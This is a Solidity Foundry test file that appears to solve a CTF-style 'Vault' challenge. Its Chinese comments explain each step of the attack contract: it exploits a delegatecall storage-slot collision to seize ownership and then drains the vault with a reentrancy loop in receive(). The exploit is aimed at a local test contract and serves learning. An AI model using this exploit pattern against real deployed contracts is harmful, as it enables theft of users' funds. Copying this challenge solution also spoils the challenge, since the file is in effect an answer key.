// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";



contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 1. 部署攻击合约
        Attack attack = new Attack(payable(address(vault)));
        
        // 2. 执行攻击
        // 我们需要传递 Vault 存储中 slot 1 的值作为密码。
        // 在 Vault 合约中，slot 1 存储的是 logic 合约的地址。
        bytes32 passwordInVaultSlot1 = bytes32(uint256(uint160(address(logic))));
        attack.attack{value: 0.01 ether}(passwordInVaultSlot1);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}

contract Attack {
    Vault public vault;
    bytes32 password;

    constructor(address payable _vault) {
        vault = Vault(_vault);
    }

    function attack(bytes32 _password) external payable {
        password = _password;
        // 1. 通过 delegatecall 修改 Vault 的 owner
        // 触发 fallback -> delegatecall logic.changeOwner
        // 这里的思想不是要获取实际保存在VaultLogic中的password
        // 而是通过delegatecall把VaultLogic的changeOwner的上下文拉到Vault的上下文
        // 而在 Vault 合约中，slot 1 存储的是 logic 合约的地址。（本来在 VaultLogic 合约中，slot 1 存储的是 password ）
        // 因此changeOwner(bytes32,address)的password判别实际比较的是Vault的logic合约的地址，而不是VaultLogic的password。
        // 那么我只需要传入logic的地址，和保存在Vault的slot 1中的logic的地址，就可以顺利通过判别。
        // 所以我们可以通过 delegatecall 修改 Vault 的 owner。
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", _password, address(this))
        );
        require(success, "changeOwner failed");

        // 2. 开启提现
        vault.openWithdraw();

        // 3. 存款以获得提现资格
        vault.deposite{value: msg.value}();

        // 4. 触发重入攻击提现
        vault.withdraw();
        
        // 将资金转给 player (msg.sender)
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
